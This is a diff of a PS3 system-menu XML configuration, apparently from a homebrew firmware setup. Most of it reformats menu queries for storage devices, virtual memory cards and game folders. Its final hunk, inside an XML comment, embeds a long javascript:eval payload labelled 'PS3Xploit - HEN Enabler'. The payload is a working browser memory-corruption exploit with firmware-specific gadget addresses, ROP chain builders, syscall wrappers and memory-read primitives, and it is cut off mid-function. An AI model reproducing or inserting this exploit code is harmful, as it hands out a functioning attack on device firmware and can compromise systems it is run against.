+				<Pair key="sd_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_SD+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="cf_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_CF+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="mass_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
+				<Pair key="data_connection"><String>xcb://localhost/query?limit=2048&ssort=root.sort_selected.savedata_psp_all</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/xmlsavedata-psp" key="sdpsp" attr="sdpsp"/>
+		</Items>
+	</View>
 
 	<View id="seg_gameexit">
 		<Items>
-			<Item class="type:x-xmb/xmlgameexit" key="gameexit" />
+			<Item class="type:x-xmb/xmlgameexit" key="gameexit"/>
 		</Items>
 	</View>
 
@@ -425,7 +262,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item class="type:x-xmb/module-action" key="manual" attr="manual" />
+			<Item class="type:x-xmb/module-action" key="manual" attr="manual"/>
 		</Items>
 	</View>
 
@@ -442,47 +279,19 @@
 		</Attributes>
 		<Items>
 			<!-- MS -->
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="vmc_device_ms"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_MS+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_MS_STD %xCB_MEDIA_TYPE_MS_IOX+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="vmc_device_ms" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_MS+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_MS_STD %xCB_MEDIA_TYPE_MS_IOX+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"/>
 			<!-- SD -->
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="vmc_device_sd"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_SD+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="vmc_device_sd" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_SD+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"/>
 			<!-- CF -->
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="vmc_device_cf"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_CF+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="vmc_device_cf" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_CF+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"/>
 			<!-- USBMASS -->
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="vmc_device_usbmass"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="vmc_device_usbmass" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psv&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA"/>
 			<!-- for PS1/PS2 MemoryCard Adpter -->
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="vmc_seg_device_usb_ps2mc"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS2MC"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="vmc_seg_device_usb_ps1mc"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS1MC"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="vmc_seg_device_usb_pda"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PDA"
-				/>
-			<Query class="type:x-xmb/folder-pixmap" key="seg_newvmc" attr="seg_newvmc" src="#seg_newvmc" />
-			<Query class="type:x-xmb/folder-pixmap" key="sdvmc"  attr="sdvmc" src="xcb://localhost/query?limit=2048&ssort=root.sort_selected.vmc_all&genre=Game&cond=Aa+Vmc:Common.title" />
+			<Query class="type:x-xmb/folder-pixmap" key="vmc_seg_device_usb_ps2mc" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS2MC"/>
+			<Query class="type:x-xmb/folder-pixmap" key="vmc_seg_device_usb_ps1mc" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS1MC"/>
+			<Query class="type:x-xmb/folder-pixmap" key="vmc_seg_device_usb_pda" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-psmc&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PDA"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_newvmc" attr="seg_newvmc" src="#seg_newvmc"/>
+			<Query class="type:x-xmb/folder-pixmap" key="sdvmc" attr="sdvmc" src="xcb://localhost/query?limit=2048&ssort=root.sort_selected.vmc_all&genre=Game&cond=Aa+Vmc:Common.title"/>
 		</Items>
 	</View>
 
@@ -494,7 +303,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item  class="type:x-xmb/vmc-new" key="new_vmc" attr="new_vmc" />
+			<Item class="type:x-xmb/vmc-new" key="new_vmc" attr="new_vmc"/>
 		</Items>
 	</View>
 
@@ -505,7 +314,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xmb/folder-pixmap" key="copy_new_vmc"  attr="copy_new_vmc" />
+			<Query class="type:x-xmb/folder-pixmap" key="copy_new_vmc" attr="copy_new_vmc"/>
 		</Items>
 	</View>
 
@@ -527,77 +336,19 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_dummy_items"
-				src="#seg_dummy_items"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_dummy_minis"
-				src="#seg_dummy_minis"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_dummy_items2"
-				src="#seg_dummy_items2"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_welcome"
-				attr="seg_welcome"
-				src="sel://localhost/welcome?type=game"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_gameexit"
-				src="sel://localhost/ingame?path=category_game.xml#seg_gameexit&type=game"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_manual"
-				src="sel://localhost/ingame?path=category_game.xml#seg_manual&type=manual"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device"
-				attr="seg_device"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+An+StorageMedia:Common.fileName BDV"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device_bdv"
-				attr="seg_device_bdv"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:Common.fileName BDV"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device2"
-				attr="seg_device2"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="gameDir"
-				attr="gameDir"
-				src="xcb://localhost/query?limit=2048&table=MMS_MEDIA_TYPE_HDD&sort=-Game:Common.stat.rating-Game:Common.timeCreated&cond=Aa+Game:Common.title+An+Game:Game.category GD+An+Game:Game.category 2D+An+Game:Game.category CB+An+Game:Game.category HM+An+Game:Game.category AT+An+Game:Game.category AV+An+Game:Game.category AM+An+Game:Game.category VF+An+Game:Game.category AP+An+Game:Game.category BV+An+Game:Game.category WT+An+Game:Game.category SF+An+Game:Game.category AS+An+Game:Common.fileName SCEAPPS01+An+Game:Common.fileName SCEAPPS02+An+Game:Common.fileName SCEAPPS03+AG+Game:Common.stat.rating 300"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_hdd_install"
-				src="ese://localhost/query?type=install_game"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_pkg_install"
-				src="ese://localhost/query?type=install_pkg"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="gameDir2"
-				attr="gameDir2"
-				src="sel://localhost/ex?root.view_selected.game"
-			/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_dummy_items" src="#seg_dummy_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_dummy_minis" src="#seg_dummy_minis"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_dummy_items2" src="#seg_dummy_items2"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_welcome" attr="seg_welcome" src="sel://localhost/welcome?type=game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_gameexit" src="sel://localhost/ingame?path=category_game.xml#seg_gameexit&type=game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_manual" src="sel://localhost/ingame?path=category_game.xml#seg_manual&type=manual"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device" attr="seg_device" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+An+StorageMedia:Common.fileName BDV"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device_bdv" attr="seg_device_bdv" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:Common.fileName BDV"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device2" attr="seg_device2" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"/>
+			<Query class="type:x-xmb/folder-pixmap" key="gameDir" attr="gameDir" src="xcb://localhost/query?limit=2048&table=MMS_MEDIA_TYPE_HDD&sort=-Game:Common.stat.rating-Game:Common.timeCreated&cond=Aa+Game:Common.title+An+Game:Game.category GD+An+Game:Game.category 2D+An+Game:Game.category CB+An+Game:Game.category HM+An+Game:Game.category AT+An+Game:Game.category AV+An+Game:Game.category AM+An+Game:Game.category VF+An+Game:Game.category AP+An+Game:Game.category BV+An+Game:Game.category WT+An+Game:Game.category SF+An+Game:Game.category AS+An+Game:Common.fileName SCEAPPS01+An+Game:Common.fileName SCEAPPS02+An+Game:Common.fileName SCEAPPS03+AG+Game:Common.stat.rating 300"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_hdd_install" src="ese://localhost/query?type=install_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_pkg_install" src="ese://localhost/query?type=install_pkg"/>
+			<Query class="type:x-xmb/folder-pixmap" key="gameDir2" attr="gameDir2" src="sel://localhost/ex?root.view_selected.game"/>
 		</Items>
 	</View>
 
@@ -623,8 +374,8 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item  class="type:x-xmb/module-action"   key="gamedata"      attr="gamedata" />
-			<Item  class="type:x-xmb/module-action"   key="ps12save"      attr="ps12save" />
+			<Item class="type:x-xmb/module-action" key="gamedata" attr="gamedata"/>
+			<Item class="type:x-xmb/module-action" key="ps12save" attr="ps12save"/>
 		</Items>
 	</View>
 
@@ -641,10 +392,9 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item  class="type:x-xmb/module-action"   key="pspsave"       attr="pspsave" />
+			<Item class="type:x-xmb/module-action" key="pspsave" attr="pspsave"/>
 		</Items>
 	</View>
-
 
 	<View id="seg_dummy_items2">
 		<Attributes>
@@ -659,7 +409,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item  class="type:x-xmb/module-action"   key="ps3save"       attr="ps3save" />
+			<Item class="type:x-xmb/module-action" key="ps3save" attr="ps3save"/>
 		</Items>
 	</View>
 
@@ -667,13 +417,12 @@
 		<Attributes>
 			<Table key="welcome">
 				<Pair key="content_type"><String>game</String></Pair>
- 			</Table>
+			</Table>
 		</Attributes>
 		<Items>
-			<Item class="type:x-xmb/xmlwelcome" key="welcome" attr="welcome" />
+			<Item class="type:x-xmb/xmlwelcome" key="welcome" attr="welcome"/>
 		</Items>
 	</View>
-
 <!--
 	<View id="hen_xmb">
 		<Attributes>
@@ -681,7 +430,7 @@
 				<Pair key="icon"><String>/dev_flash/vsh/resource/explore/icon/hen_enable.png</String></Pair>
 				<Pair key="title"><String>★ Enable HEN</String></Pair>
 				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,index_key_addr=0,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=0x8FD8DCC0,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,vsh_opd_patch=617820,vsh_opd_addr=7256936,g1_addr=620036,g8_addr=131072,g_mod1_addr=6352696,g_mod2_addr=80756,g_mod3_addr=757248,g_mod4b_addr=0x42C778,g_mod4c_addr=0x054AF0,g_mod9_addr=0x010B20,g_mod4a_addr=890500,g_mod7_addr=108204,g_mod8_addr=2862264,hr="\74hr\76",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),utc=new Date().toJSON().slice(0,10).replace(/-/g,\47/\47),usb_sp="/dev_hdd0/hen/PS3HEN.BIN";document.write(\47\74html\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74h1\76Enabling HEN...\74/h1\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74/html\76\47);if(fwv=="4.84"){var toc_addr=7296344,vsh_opd_patch=617820,vsh_opd_addr=7256944,g1_addr=620036,g8_addr=131072,g9_addr=170760,g10_addr=6479908,g11_addr=5874864,g_mod1_addr=6352856,g_mod2_addr=80756,g_mod3_addr=757248,g_mod4a_addr=890500,g_mod4b_addr=4376440,g_mod4c_addr=346864,g_mod5_addr=4339932,g_mod6_addr=134144,g_mod7_addr=108204,g_mod8_addr=2862264,g_mod9_addr=68384,g_mod10_addr=1857428,g_mod11_addr=1618244,g_mod12_addr=6500860,g_mod13_addr=3369072,g_mod14_addr=6502656,g_mod15_addr=3788856,g_mod16_addr=5206828}function syscall_r3_p2p(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return d2b(g_mod2_addr)+f16(0x60,dbyte41)+d2b(gtemp_addr)+f16(0x10,dbyte41)+d2b(g_mod1_addr)+f16(0x50,dbyte41)+f4(0xC,dbyte41)+w2b(a)+w2b(i)+w2b(g)+w2b(f)+w2b(e)+w2b(d)+w2b(c)+f4(0x4,dbyte41)+w2b(h)+f16(0x20,dbyte41)+d2b(b)+f16(0x10,dbyte41)+d2b(g_mod4b_addr)+f16(0x60,dbyte41)+d2b(j)+d2b(sp_exit)+f8(0x8,dbyte41)}function syscall_r3r5_p2p(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return d2b(g_mod2_addr)+f16(0x60,dbyte41)+d2b(gtemp_addr)+f16(0x10,dbyte41)+d2b(g_mod1_addr)+f16(0x50,dbyte41)+f4(0xC,dbyte41)+w2b(a)+w2b(i)+w2b(g)+w2b(f)+w2b(e)+f4(0x4,dbyte41)+w2b(c)+f4(0x4,dbyte41)+w2b(h)+f16(0x10,dbyte41)+d2b(d-0x4)+d2b(gtemp_addr)+f8(0x18,dbyte41)+d2b(g_mod4c_addr)+f16(0xB0,dbyte41)+d2b(b)+f16(0x10,dbyte41)+d2b(g_mod4b_addr)+f16(0x60,dbyte41)+d2b(j)+d2b(sp_exit)+f8(0x8,dbyte41)}function stack_frame_swap(a){return d2b(g_mod2_addr)+f16(0x60,dbyte41)+d2b(gtemp_addr)+d2b(a)+f8(0x8,dbyte41)+d2b(g_mod9_addr)}function h2b(a){return String.fromCharCode(a)}function w2b(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function d2b(a){return w2b(0)+w2b(a)}String.prototype.toHex16=function(){return(\470000\47+this).substr(-4)};String.prototype.toAscii=function(a){var b=\47\47;var i=0;while(i\74this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\741){return\47\47}var b=\47\47;var c=\47\47;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}while(i\74b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\47\47)};String.prototype.convertedSize=function(a){if(this.length\741){return 0}var b=\47\47;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\47\47,sign=this\740?\47-\47:\47\47,str=a[0].replace(\47.\47,\47\47),mag=Number(a[1])+1;if(mag\740){z=sign+\470.\47;while(mag++){z+=\470\47}return z+str.replace(/^\-/,\47\47)}mag-=str.length;while(mag--){z+=\470\47}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\76\761}}g.reverse();var k=g.join(\47\47);var l=(1\74\74(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\74\74b)-1){d=f!==0?NaN:s*Infinity}else if(e\760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\76\7624)&0xFF,(a\76\7616)&0xFF,(a\76\768)&0xFF,(a)&0xFF,(b\76\7624)&0xFF,(b\76\7616)&0xFF,(b\76\768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\74\7432)|((b\76\761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\47exploit\47)){document.getElementById(\47exploit\47).style.src="local("+generateExploit(a,b)+")"}}function chkMem(a,b,c){if(document.getElementById(\47exploit\47)){readMemory(a,b);return document.getElementById(\47exploit\47).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\47trigger\47)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function load_check(){if(total_loops\74max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\47exploit\47).style.src.substr(6,d);var i=0,t,k,f,g;while(i\74(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\74(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(g8_addr,a,b,c,0,0,0,0,0,0,0x70)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+w2b(g1_addr)+w2b(toc_addr)+f16(0x20,dbyte41)+d2b(toc_addr)+f16(0x70,dbyte41)}function stack_frame_exit(){return d2b(g_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return d2b(g_mod2_addr)+f16(0x60,dbyte41)+d2b(gtemp_addr)+f16(0x10,dbyte41)+d2b(g_mod1_addr)+f16(0x50,dbyte41)+f4(0xC,dbyte41)+w2b(a)+w2b(i)+w2b(g)+w2b(f)+w2b(e)+w2b(d)+w2b(c)+f4(0x4,dbyte41)+w2b(h)+f16(0x20,dbyte41)+d2b(b)+f16(0x10,dbyte41)+d2b(g_mod2_addr)+f16(0x60,dbyte41)+d2b(gtemp_addr)+f16(0x10,dbyte41)+d2b(g_mod4a_addr)+f16(0x60,dbyte41)+d2b(j)+d2b(sp_exit)+f8(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return 